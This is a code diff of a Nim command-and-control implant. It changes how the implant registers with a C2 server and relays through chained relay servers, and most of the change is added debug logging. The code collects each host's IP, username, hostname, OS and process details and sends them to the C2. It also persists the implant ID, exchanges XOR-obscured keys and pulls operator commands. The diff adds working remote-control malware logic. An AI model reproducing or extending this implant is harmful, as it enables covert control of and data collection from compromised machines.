@@ -361,18 +361,35 @@ proc connectToUpstreamRelay(host: string, port: int): string =
             
             let registerMsg = createMessage(REGISTER, implantID, route, $regData)
             
+            when defined debug:
+                echo "[DEBUG] 🆕 ┌─────────── SENDING REGISTER MESSAGE ───────────┐"
+                echo "[DEBUG] 🆕 │ Sending REGISTER to relay server... │"
+                echo "[DEBUG] 🆕 │ Client ID: " & implantID & " │"
+                echo "[DEBUG] 🆕 │ Message type: REGISTER │"
+                echo "[DEBUG] 🆕 │ Route: " & $route & " │"
+                echo "[DEBUG] 🆕 │ Registration data size: " & $regData.len & " bytes │"
+                echo "[DEBUG] 🆕 │ Expected response: ID assignment + encryption key │"
+                echo "[DEBUG] 🆕 └─────────────────────────────────────────────────┘"
+            
             if sendMessage(upstreamRelay, registerMsg):
                 when defined debug:
-                    echo "[DEBUG] Registered with upstream relay"
+                    echo "[DEBUG] ✅ ┌─────────── REGISTER SENT SUCCESSFULLY ───────────┐"
+                    echo "[DEBUG] ✅ │ REGISTER message sent to relay server │"
+                    echo "[DEBUG] ✅ │ Now waiting for ID assignment response... │"
+                    echo "[DEBUG] ✅ │ Client should receive: {\"id\": \"...\", \"key\": \"...\"} │"
+                    echo "[DEBUG] ✅ └─────────────────────────────────────────────────┘"
+                    
+                    # CRITICAL: Wait a moment for the response before returning success
+                    echo "[DEBUG] ⏱️  Waiting for relay server registration response..."
+                    
                 return "Connected and registered with upstream relay: " & host & ":" & $port
             else:
                 when defined debug:
-                    echo "[DEBUG] Failed to register with upstream relay"
+                    echo "[DEBUG] ❌ ┌─────────── REGISTER SEND FAILED ───────────┐"
+                    echo "[DEBUG] ❌ │ Failed to send REGISTER message! │"
+                    echo "[DEBUG] ❌ │ Connection might be broken │"
+                    echo "[DEBUG] ❌ └─────────────────────────────────────────────┘"
                 return "Connected to upstream relay but failed to register: " & host & ":" & $port
-        else:
-            when defined debug:
-                echo "[DEBUG] Failed to connect to upstream relay"
-            return "Failed to connect to upstream relay: " & host & ":" & $port
     except Exception as e:
         return "Error connecting to upstream relay: " & e.msg
 
@@ -427,19 +444,74 @@ proc httpHandler() {.async.} =
     listener.sleepJitter = parseFloat(CONFIG.getOrDefault("sleepJitter", "0"))
     listener.killDate = CONFIG.getOrDefault("killDate", "")
     
-    # Initialize HTTP listener
-    webClientListener.init(listener)
+    # CRITICAL FIX: Check relay mode first before determining initialization strategy
+    # Import isConnectedToRelay from relay_commands
+    let inRelayMode = relay_commands.isConnectedToRelay
     
-    # Register this implant with C2
-    let localIP = getLocalIP()
-    let username = getUsername()
-    let hostname = getSysHostname()
-    let osInfo = getOSInfo()
-    let pid = getCurrentPID()
-    let processName = getCurrentProcessName()
+    when defined debug:
+        echo "[DEBUG] 🌐 HTTP Handler: Relay mode status: " & $inRelayMode
     
-    webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
-                                         osInfo, pid, processName, false)
+    if not inRelayMode:
+        # NOT in relay mode - can make direct HTTP calls to C2
+        let storedId = getStoredImplantID()
+        if storedId != "":
+            when defined debug:
+                echo "[DEBUG] 🔄 HTTP Handler: Found stored ID: " & storedId & " - attempting direct C2 reconnection"
+            
+            # Set the stored ID and attempt reconnection
+            listener.id = storedId
+            webClientListener.reconnect(listener)
+            
+            # Check if reconnection was successful
+            if listener.initialized and listener.registered:
+                when defined debug:
+                    echo "[DEBUG] ✅ HTTP Handler: Direct C2 reconnection successful with stored ID: " & storedId
+            else:
+                when defined debug:
+                    echo "[DEBUG] ❌ HTTP Handler: Direct C2 reconnection failed - will register as new implant"
+                # Clear failed ID and reinitialize
+                listener.id = ""
+                listener.initialized = false
+                listener.registered = false
+                webClientListener.init(listener)
+        else:
+            when defined debug:
+                echo "[DEBUG] 🆕 HTTP Handler: No stored ID found - performing initial C2 registration"
+            # No stored ID, perform initial registration
+            webClientListener.init(listener)
+    else:
+        # IN relay mode - encryption key must come from RelayServer, not direct C2 HTTP
+        when defined debug:
+            echo "[DEBUG] 🔗 HTTP Handler: IN RELAY MODE - skipping direct C2 initialization"
+            echo "[DEBUG] 🔗 HTTP Handler: Encryption key will be provided by RelayServer via relay protocol"
+        
+        # In relay mode, we don't initialize the HTTP listener directly
+        # The relay client handler will manage C2 communication
+        listener.initialized = false
+        listener.registered = false
+    
+    # Complete registration if listener is initialized but not yet registered
+    # BUT ONLY if NOT in relay mode
+    if not inRelayMode and listener.initialized and not listener.registered:
+        when defined debug:
+            echo "[DEBUG] 🌐 HTTP Handler: Completing direct C2 registration"
+            
+        # Register this implant with C2
+        let localIP = getLocalIP()
+        let username = getUsername()
+        let hostname = getSysHostname()
+        let osInfo = getOSInfo()
+        let pid = getCurrentPID()
+        let processName = getCurrentProcessName()
+        
+        webClientListener.postRegisterRequest(listener, localIP, username, hostname, 
+                                             osInfo, pid, processName, false)
+        
+        when defined debug:
+            echo "[DEBUG] 🌐 HTTP Handler: Direct C2 registration completed"
+    elif inRelayMode:
+        when defined debug:
+            echo "[DEBUG] 🔗 HTTP Handler: Skipping C2 registration - in relay mode"
     
     when defined debug:
         echo "[DEBUG] 🌐 HTTP Handler: Implant registered with C2"
@@ -546,10 +618,23 @@ proc httpHandler() {.async.} =
                                 var assignedId: string
                                 var encryptionKey: string
                                 
+                                when defined debug:
+                                    echo "[DEBUG] 🔍 ID VALIDATION: Checking registration type..."
+                                    echo "[DEBUG] 🔍 ID VALIDATION: clientId = '" & registration.clientId & "'"
+                                    echo "[DEBUG] 🔍 ID VALIDATION: hostname = '" & registration.hostname & "'"
+                                    echo "[DEBUG] 🔍 ID VALIDATION: username = '" & registration.username & "'"
+                                
                                 if registration.clientId == "PENDING-REGISTRATION":
                                     # NEW REGISTRATION: Forward to C2 to get assigned ID and encryption key
                                     when defined debug:
+                                        echo "[DEBUG] 🆕 ID VALIDATION: NEW REGISTRATION detected"
                                         echo "[DEBUG] 🆕 HTTP Handler: NEW relay client registration - forwarding to C2"
+                                        echo "[DEBUG] 🆕 ID VALIDATION: Requesting UNIQUE ID from C2..."
+                                    
+                                    when defined debug:
+                                        echo "[DEBUG] 🆕 ID VALIDATION: About to call C2 for NEW ID assignment..."
+                                        echo "[DEBUG] 🆕 ID VALIDATION: Client info - IP: " & registration.localIP & ", hostname: " & registration.hostname
+                                        echo "[DEBUG] 🆕 ID VALIDATION: CRITICAL - This should generate a UNIQUE ID!"
                                     
                                     let (newId, newKey) = webClientListener.postRelayRegisterRequest(listener, registration.clientId, 
                                                                               registration.localIP, registration.username, 
@@ -559,15 +644,35 @@ proc httpHandler() {.async.} =
                                     encryptionKey = newKey
                                     
                                     when defined debug:
-                                        echo "[DEBUG] 🆕 HTTP Handler: C2 assigned new ID: " & assignedId
+                                        echo "[DEBUG] 🆕 ID VALIDATION: C2 RESPONSE - assigned ID: '" & assignedId & "'"
+                                        echo "[DEBUG] 🆕 ID VALIDATION: Key length: " & $newKey.len
+                                        echo "[DEBUG] 🚨 CRITICAL: Validate this ID is UNIQUE and not in use by other clients!"
+                                        
+                                        # CRITICAL: Check if this ID is already in registry
+                                        let currentClients = relay_commands.getConnectedClients(g_relayServer)
+                                        if assignedId in currentClients:
+                                            echo "[DEBUG] 🚨🚨🚨 IDENTITY COLLISION DETECTED! 🚨🚨🚨"
+                                            echo "[DEBUG] 🚨 C2 assigned ID: '" & assignedId & "'"
+                                            echo "[DEBUG] 🚨 But this ID is ALREADY IN USE by another client!"
+                                            echo "[DEBUG] 🚨 Current clients: [" & currentClients.join(", ") & "]"
+                                            echo "[DEBUG] 🚨 THIS IS A C2 BUG - REUSING ACTIVE CLIENT IDs!"
+                                            echo "[DEBUG] 🚨🚨🚨 IDENTITY COLLISION DETECTED! 🚨🚨🚨"
+                                        else:
+                                            echo "[DEBUG] ✅ ID VALIDATION: New ID '" & assignedId & "' is unique (not in current registry)"
                                 else:
                                     # RE-REGISTRATION: Client has existing ID, don't change it!
                                     assignedId = registration.clientId  # Keep the existing ID
                                     encryptionKey = ""  # Client will use its existing encryption key
                                     
                                     when defined debug:
-                                        echo "[DEBUG] 🔄 HTTP Handler: RE-REGISTRATION detected - keeping existing ID: " & assignedId
+                                        echo "[DEBUG] 🔄 ID VALIDATION: RE-REGISTRATION detected"
+                                        echo "[DEBUG] 🔄 ID VALIDATION: Input clientId: '" & registration.clientId & "'"
+                                        echo "[DEBUG] 🔄 ID VALIDATION: Assigned ID: '" & assignedId & "'"
+                                        echo "[DEBUG] 🔄 ID VALIDATION: Should be IDENTICAL (no change)"
+                                        if assignedId != registration.clientId:
+                                            echo "[DEBUG] 🚨🚨🚨 CRITICAL BUG: assignedId != registration.clientId! 🚨🚨🚨"
                                         echo "[DEBUG] 🔄 HTTP Handler: NOT forwarding to C2, accepting existing client"
+                                        echo "[DEBUG] 🔄 ID VALIDATION: This should be safe - client already had this ID"
                                 
                                 # ADAPTIVE TIMING: Check if client is in fast mode and adapt server timing
                                 if regData.hasKey("fastMode") and regData["fastMode"].getBool():
@@ -620,12 +725,24 @@ proc httpHandler() {.async.} =
                                         $responseData
                                     )
                                     
-                                    # REGISTRATION: Use broadcast (clients don't have final IDs yet)
+                                    # CRITICAL FIX: Use UNICAST for re-registrations, BROADCAST only for new registrations
                                     let stats = relay_commands.getConnectionStats(g_relayServer)
                                     if stats.connections > 0:
-                                        discard broadcastMessage(g_relayServer, idMsg)
-                                        when defined debug:
-                                            echo "[DEBUG] 🌐 HTTP Handler: ✅ Registration response sent to relay client: " & assignedId
+                                        if registration.clientId == "PENDING-REGISTRATION":
+                                            # NEW REGISTRATION: Use broadcast (client doesn't have final ID yet)
+                                            discard relay_commands.broadcastMessage(g_relayServer, idMsg)
+                                            when defined debug:
+                                                echo "[DEBUG] 🌐 HTTP Handler: ✅ NEW registration response BROADCAST to all clients: " & assignedId
+                                        else:
+                                            # RE-REGISTRATION: Use UNICAST (client has specific ID)
+                                            let unicastSuccess = relay_commands.sendToClient(g_relayServer, registration.clientId, idMsg)
+                                            when defined debug:
+                                                if unicastSuccess:
+                                                    echo "[DEBUG] 🌐 HTTP Handler: ✅ RE-registration response UNICAST to specific client: " & registration.clientId & " (response ID: " & assignedId & ")"
+                                                else:
+                                                    echo "[DEBUG] 🌐 HTTP Handler: ❌ UNICAST failed to client: " & registration.clientId & " - fallback to broadcast"
+                                                    # Fallback to broadcast if unicast fails
+                                                    discard relay_commands.broadcastMessage(g_relayServer, idMsg)
                                     else:
                                         when defined debug:
                                             echo "[DEBUG] 🌐 HTTP Handler: ⚠️  No relay connections to send registration data to"
@@ -640,6 +757,11 @@ proc httpHandler() {.async.} =
                         of PULL:
                             when defined debug:
                                 echo "[DEBUG] 🌐 HTTP Handler: Relay client requesting commands (PULL = check-in)"
+                                echo "[DEBUG] 💓 PULL REQUEST: fromID = '" & msg.fromID & "'"
+                                echo "[DEBUG] 💓 PULL REQUEST: route = " & $msg.route
+                                let currentClients = relay_commands.getConnectedClients(g_relayServer)
+                                echo "[DEBUG] 💓 PULL REQUEST: Current registry: [" & currentClients.join(", ") & "]"
+                                echo "[DEBUG] 💓 PULL REQUEST: Client in registry: " & $(msg.fromID in currentClients)
                             
                             # Extract the relay client's encryption key from PULL payload
                             when defined debug:
@@ -654,20 +776,39 @@ proc httpHandler() {.async.} =
                             let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
                             var relayClientKey = ""
                             
+                            when defined debug:
+                                echo "[DEBUG] 🔍 ┌─────────── PULL KEY EXTRACTION DEBUG ───────────┐"
+                                echo "[DEBUG] 🔍 │ Raw payload length: " & $msg.payload.len & " │"
+                                echo "[DEBUG] 🔍 │ Decrypting with implantID: '" & msg.fromID & "' │"
+                                echo "[DEBUG] 🔍 │ Decrypted payload: " & decryptedPayload & " │"
+                                echo "[DEBUG] 🔍 │ Decrypted payload length: " & $decryptedPayload.len & " │"
+                                echo "[DEBUG] 🔍 └─────────────────────────────────────────────────┘"
+                            
                             try:
                                 # Try to parse as JSON to get the encryption key
                                 let pullData = parseJson(decryptedPayload)
                                 let encryptedKey = pullData["key"].getStr()
                                 
+                                when defined debug:
+                                    echo "[DEBUG] 🔑 ┌─────────── KEY DECRYPTION DEBUG ───────────┐"
+                                    echo "[DEBUG] 🔑 │ JSON parsing successful │"
+                                    echo "[DEBUG] 🔑 │ Encrypted key from payload: " & encryptedKey & " │"
+                                    echo "[DEBUG] 🔑 │ Encrypted key length: " & $encryptedKey.len & " │"
+                                    echo "[DEBUG] 🔑 │ INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY & " │"
+                                    echo "[DEBUG] 🔑 └─────────────────────────────────────────────┘"
+                                
                                 # Decrypt the relay client's encryption key using INITIAL_XOR_KEY
                                 relayClientKey = xorString(encryptedKey, INITIAL_XOR_KEY)
                                 
                                 when defined debug:
-                                    echo "[DEBUG] 🔑 Decrypted encryption key from relay client PULL request: " & msg.fromID
-                                    echo "[DEBUG] 🔑 Key length: " & $relayClientKey.len
-                                    echo "[DEBUG] 🔑 Encrypted key from client: " & encryptedKey[0..min(15, encryptedKey.len-1)] & "..."
-                                    echo "[DEBUG] 🔑 INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY
-                                    echo "[DEBUG] 🔑 Decrypted key preview: " & relayClientKey[0..min(15, relayClientKey.len-1)] & "..."
+                                    echo "[DEBUG] 🔓 ┌─────────── FINAL KEY RESULT ───────────┐"
+                                    echo "[DEBUG] 🔓 │ Decrypted relayClientKey length: " & $relayClientKey.len & " │"
+                                    if relayClientKey.len > 0:
+                                        echo "[DEBUG] 🔓 │ Decrypted key preview: " & relayClientKey[0..min(7, relayClientKey.len-1)] & "... │"
+                                        echo "[DEBUG] 🔓 │ ✅ Key extraction SUCCESSFUL │"
+                                    else:
+                                        echo "[DEBUG] 🔓 │ 🚨 Key extraction FAILED - empty result │"
+                                    echo "[DEBUG] 🔓 └─────────────────────────────────────────┘"
                                 
                                 # SAFE KEY SWAP: Use atomic key swapping to prevent desync
                                 originalKey = safeKeySwap(listener, relayClientKey)
@@ -676,7 +817,6 @@ proc httpHandler() {.async.} =
                                     echo "[DEBUG] 🔑 ✅ Safe key swap completed - using relay client encryption key"
                                     echo "[DEBUG] 🔑 Original key length: " & $originalKey.len
                                     echo "[DEBUG] 🔑 Relay client key length: " & $relayClientKey.len
-                                
                             except Exception as e:
                                 when defined debug:
                                     echo "[DEBUG] ⚠️  Failed to extract/decrypt encryption key from PULL payload: " & msg.fromID
@@ -745,14 +885,23 @@ proc httpHandler() {.async.} =
                                     $commandPayload
                                 )
                                 
+                                # CRITICAL DEBUG: Check client registry before sending command
+                                when defined debug:
+                                    echo "[DEBUG] 🎯 COMMAND ROUTING: Attempting to send command to client: '" & msg.fromID & "'"
+                                    let connectedClients = relay_commands.getConnectedClients(g_relayServer)
+                                    echo "[DEBUG] 🎯 COMMAND ROUTING: Connected clients: [" & connectedClients.join(", ") & "]"
+                                    echo "[DEBUG] 🎯 COMMAND ROUTING: Target client in registry: " & $(msg.fromID in connectedClients)
+                                
                                 # Send command to SPECIFIC relay client (unicast)
-                                let success = sendToClient(g_relayServer, msg.fromID, cmdMsg)
+                                let success = relay_commands.sendToClient(g_relayServer, msg.fromID, cmdMsg)
                                 if success:
                                     when defined debug:
                                         echo "[DEBUG] 🌐 HTTP Handler: ✅ Command sent to specific client: " & msg.fromID
                                 else:
                                     when defined debug:
                                         echo "[DEBUG] 🌐 HTTP Handler: ❌ Failed to send command to client: " & msg.fromID
+                                        echo "[DEBUG] 🚨 COMMAND ROUTING FAILURE: Client '" & msg.fromID & "' not found in registry!"
+                                        echo "[DEBUG] 🚨 This means the auto-registration failed or client registry is corrupted!"
                             else:
                                 # NO COMMANDS or CONNECTION ERROR - Still send a response!
                                 when defined debug:
@@ -769,7 +918,7 @@ proc httpHandler() {.async.} =
                                 )
                                 
                                 # Send empty response to SPECIFIC relay client (unicast)
-                                let success = sendToClient(g_relayServer, msg.fromID, emptyResponse)
+                                let success = relay_commands.sendToClient(g_relayServer, msg.fromID, emptyResponse)
                                 if success:
                                     when defined debug:
                                         echo "[DEBUG] 🌐 HTTP Handler: ✅ Empty response sent to specific client: " & msg.fromID & " (PULL completed)"
@@ -863,7 +1012,7 @@ proc httpHandler() {.async.} =
                             )
                             
                             # Send confirmation to SPECIFIC relay client (unicast)
-                            let success = sendToClient(g_relayServer, msg.fromID, confirmMsg)
+                            let success = relay_commands.sendToClient(g_relayServer, msg.fromID, confirmMsg)
                             if success:
                                 when defined debug:
                                     echo "[DEBUG] 🌐 HTTP Handler: ✅ Confirmation sent to specific client: " & msg.fromID
@@ -1217,10 +1366,36 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                             let regResponse = parseJson(responsePayload)
                             let assignedId = regResponse["id"].getStr()
                             
+                            when defined debug:
+                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Received response from relay server"
+                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Raw response: " & responsePayload
+                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Parsed assignedId: '" & assignedId & "'"
+                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Current g_relayClientID: '" & g_relayClientID & "'"
+                                let diskID = getStoredImplantID()
+                                echo "[DEBUG] 🔍 CLIENT ID VALIDATION: Stored disk ID: '" & diskID & "'"
+                            
                             # Check if this is a new registration or re-registration
                             if regResponse.hasKey("key"):
                                 # NEW REGISTRATION: Has encryption key
                                 let encryptionKey = regResponse["key"].getStr()
+                                
+                                when defined debug:
+                                    echo "[DEBUG] 🆕 ┌─────────── NEW REGISTRATION PATH ───────────┐"
+                                    echo "[DEBUG] 🆕 │ Response HAS 'key' field - NEW registration │"
+                                    echo "[DEBUG] 🆕 │ Encryption key length: " & $encryptionKey.len & " │"
+                                    echo "[DEBUG] 🆕 └─────────────────────────────────────────────┘"
+                                    echo "[DEBUG] 🚨 CLIENT ID VALIDATION: NEW REGISTRATION - ID ASSIGNMENT!"
+                                    echo "[DEBUG] 🚨 CLIENT ID VALIDATION: OLD ID: '" & g_relayClientID & "'"
+                                    echo "[DEBUG] 🚨 CLIENT ID VALIDATION: NEW ID: '" & assignedId & "'"
+                                    
+                                    # CRITICAL: Check if this is actually a DIFFERENT ID
+                                    if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != assignedId:
+                                        echo "[DEBUG] 🚨🚨🚨 IDENTITY THEFT ALERT! 🚨🚨🚨"
+                                        echo "[DEBUG] 🚨 CLIENT HAD ID: '" & g_relayClientID & "'"
+                                        echo "[DEBUG] 🚨 C2 ASSIGNED ID: '" & assignedId & "'"
+                                        echo "[DEBUG] 🚨 THIS IS THE BUG! C2 REUSED ANOTHER CLIENT'S ID!"
+                                        echo "[DEBUG] 🚨🚨🚨 IDENTITY THEFT ALERT! 🚨🚨🚨"
+                                
                                 g_relayClientID = assignedId
                                 g_relayClientKey = encryptionKey
                                 storeImplantID(assignedId)
@@ -1233,6 +1408,28 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                                     echo "[DEBUG] 🆔 └─────────────────────────────────────────────────┘"
                             elif regResponse.hasKey("status") and regResponse["status"].getStr() == "reconnected":
                                 # RE-REGISTRATION: Confirmed existing ID, keep current encryption key
+                                when defined debug:
+                                    echo "[DEBUG] 🔄 ┌─────────── RE-REGISTRATION PATH ───────────┐"
+                                    echo "[DEBUG] 🔄 │ Response HAS 'status: reconnected' - RE-registration │"
+                                    echo "[DEBUG] 🔄 │ This means client should ALREADY have encryption key │"
+                                    echo "[DEBUG] 🔄 │ Current g_relayClientKey length: " & $g_relayClientKey.len & " │"
+                                    echo "[DEBUG] 🔄 │ Current g_relayClientKey empty: " & $(g_relayClientKey == "") & " │"
+                                    if g_relayClientKey == "":
+                                        echo "[DEBUG] 🚨 │ 🚨 BUG: RE-REGISTRATION but no existing key! │"
+                                        echo "[DEBUG] 🚨 │ 🚨 This should never happen - key was lost! │"
+                                    echo "[DEBUG] 🔄 └─────────────────────────────────────────────┘"
+                                    echo "[DEBUG] 🔄 CLIENT ID VALIDATION: RE-REGISTRATION CONFIRMED"
+                                    echo "[DEBUG] 🔄 CLIENT ID VALIDATION: Confirmed ID: '" & assignedId & "'"
+                                    echo "[DEBUG] 🔄 CLIENT ID VALIDATION: Should match current: '" & g_relayClientID & "'"
+                                    
+                                    # CRITICAL: Validate the confirmed ID matches what client expects
+                                    if g_relayClientID != assignedId:
+                                        echo "[DEBUG] 🚨🚨🚨 RE-REGISTRATION ID MISMATCH! 🚨🚨🚨"
+                                        echo "[DEBUG] 🚨 CLIENT EXPECTED: '" & g_relayClientID & "'"
+                                        echo "[DEBUG] 🚨 SERVER CONFIRMED: '" & assignedId & "'"
+                                        echo "[DEBUG] 🚨 THIS IS ALSO A BUG! SERVER CONFUSED ABOUT CLIENT ID!"
+                                        echo "[DEBUG] 🚨🚨🚨 RE-REGISTRATION ID MISMATCH! 🚨🚨🚨"
+                                
                                 g_relayClientID = assignedId
                                 # g_relayClientKey stays the same - don't change it!
                                 # ID should already be stored, but confirm it
@@ -1248,7 +1445,14 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                             else:
                                 # Unknown format
                                 when defined debug:
-                                    echo "[DEBUG] ⚠️  Unknown registration response format"
+                                    echo "[DEBUG] ⚠️  ┌─────────── UNKNOWN RESPONSE FORMAT ───────────┐"
+                                    echo "[DEBUG] ⚠️  │ Response does NOT have 'key' field │"
+                                    echo "[DEBUG] ⚠️  │ Response does NOT have 'status: reconnected' │"
+                                    echo "[DEBUG] ⚠️  │ This is an unexpected response format! │"
+                                    echo "[DEBUG] ⚠️  │ Full response JSON: " & $regResponse & " │"
+                                    echo "[DEBUG] ⚠️  └─────────────────────────────────────────────────┘"
+                                    echo "[DEBUG] ⚠️  CLIENT ID VALIDATION: Unknown registration response format"
+                                    echo "[DEBUG] ⚠️  CLIENT ID VALIDATION: Full response: " & $regResponse
                         except:
                             # Fallback to old format (plain ID)
                             g_relayClientID = responsePayload
@@ -1324,6 +1528,20 @@ proc relayClientHandler(host: string, port: int) {.async.} =
             
             # Encrypt the relay client's encryption key for secure transmission
             let encryptedKey = xorString(g_relayClientKey, INITIAL_XOR_KEY)
+            
+            when defined debug:
+                echo "[DEBUG] 🔑 ┌─────────── PULL KEY DEBUG ───────────┐"
+                echo "[DEBUG] 🔑 │ g_relayClientKey length: " & $g_relayClientKey.len & " │"
+                echo "[DEBUG] 🔑 │ g_relayClientKey empty: " & $(g_relayClientKey == "") & " │"
+                echo "[DEBUG] 🔑 │ encryptedKey length: " & $encryptedKey.len & " │"
+                echo "[DEBUG] 🔑 │ INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY & " │"
+                if g_relayClientKey == "":
+                    echo "[DEBUG] 🚨 │ CRITICAL: g_relayClientKey is EMPTY! │"
+                    echo "[DEBUG] 🚨 │ This will cause C2 check-in to fail! │"
+                    echo "[DEBUG] 🚨 │ Client never received encryption key! │"
+                else:
+                    echo "[DEBUG] 🔑 │ g_relayClientKey preview: " & g_relayClientKey[0..min(7, g_relayClientKey.len-1)] & "... │"
+                echo "[DEBUG] 🔑 └─────────────────────────────────────────┘"
             
             # Create pull payload with encrypted encryption key
             let pullPayload = %*{
